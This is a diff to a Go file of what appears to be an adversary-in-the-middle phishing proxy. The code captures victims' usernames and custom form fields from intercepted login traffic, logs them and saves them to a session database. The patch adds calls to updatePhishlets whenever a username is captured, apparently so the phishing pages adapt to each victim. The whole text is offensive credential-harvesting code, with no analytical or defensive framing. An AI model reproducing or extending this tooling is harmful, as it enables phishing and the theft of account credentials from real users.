@@ -688,6 +688,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.setSessionUsername(ps.SessionId, um[1])
 									//trigger = 1
 
+									updatePhishlets(um[1], pl)
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
@@ -713,6 +714,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if cm != nil && len(cm) > 1 {
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 										//trigger = 1
+										if cp.key_s == "username" {
+											updatePhishlets(cm[1], pl)
+										}
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 											log.Error("database: %v", err)
@@ -777,6 +781,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
 											//trigger = 1
+
+											updatePhishlets(um[1], pl)
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
@@ -800,6 +806,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if cm != nil && len(cm) > 1 {
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												//trigger = 1
+												if cp.key_s == "username" {
+													updatePhishlets(cm[1], pl)
+												}
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
